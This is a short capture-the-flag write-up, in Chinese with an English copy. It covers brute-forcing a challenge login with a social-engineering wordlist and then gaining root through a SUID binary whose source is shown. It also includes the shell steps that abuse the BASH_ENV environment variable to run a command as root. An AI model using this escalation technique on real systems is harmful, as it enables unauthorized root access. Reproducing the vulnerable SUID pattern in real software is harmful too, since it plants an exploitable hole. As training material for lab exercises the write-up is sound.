## Hard guess

生成社工字典并爆破出用户名密码为`KatoMegumi:Megumi960923` ，根据题目描述 `flag` 在 `/root` ，那么思路是提权，`suid` 位找到 `/opt/hello` ，下载出来 ida 得到代码如下（我这里直接给源代码了，跟 ida 出来的伪代码几乎一样）：

```c
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>

int main(){
    setuid(0);
    setgid(0);
    char choice = 'n';
    printf("Are you Tomoya?\ny/n:\n> ");
    scanf("%c", &choice);

    if (getenv("LD_PRELOAD"))
        unsetenv("LD_PRELOAD");
    if (getenv("LD_LIBRARY_PATH"))
        unsetenv("LD_LIBRARY_PATH");
    if (getenv("LD_AUDIT"))
        unsetenv("LD_AUDIT");
    if (getenv("LD_DEBUG"))
        unsetenv("LD_DEBUG");
    if (getenv("LIBRARY_PATH"))
        unsetenv("LIBRARY_PATH");

    setenv("PATH", "/bin", 1);

    if (choice == 'y')
        system("echo 'Hello!'");
    else if (choice == 'n')
        system("bash -c \"echo 'Who are you?'\"");
    else
        printf("emm? ...");
    return 0;
}
```

环境变量注入提权

```bash
bash
export BASH_ENV=/tmp/a
echo "cat /root/flag" > /tmp/a
chmod +x /tmp/a
/opt/hello
n
```

Generage social engineering dictionary and found the username and password is `KatoMegumi:Megumi960923`. According to the description of the topic, `flag` is in `/root`, so the idea is to get the root. `suid` bit found `/opt/hello`, download it and get the source code as follows (I gave the source code directly here, almost the same as the pseudo code from ida):

```c
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>

int main(){
    setuid(0);
    setgid(0);
    char choice = 'n';
    printf("Are you Tomoya?\ny/n:\n> ");
    scanf("%c", &choice);

    if (getenv("LD_PRELOAD"))
        unsetenv("LD_PRELOAD");
    if (getenv("LD_LIBRARY_PATH"))
        unsetenv("LD_LIBRARY_PATH");
    if (getenv("LD_AUDIT"))
        unsetenv("LD_AUDIT");
    if (getenv("LD_DEBUG"))
        unsetenv("LD_DEBUG");
    if (getenv("LIBRARY_PATH"))
        unsetenv("LIBRARY_PATH");

    setenv("PATH", "/bin", 1);

    if (choice == 'y')
        system("echo 'Hello!'");
    else if (choice == 'n')
        system("bash -c \"echo 'Who are you?'\"");
    else
        printf("emm? ...");
    return 0;
}
```

Environment variable injection to get root

```bash
bash
export BASH_ENV=/tmp/a
echo "cat /root/flag" > /tmp/a
chmod +x /tmp/a
/opt/hello
n
```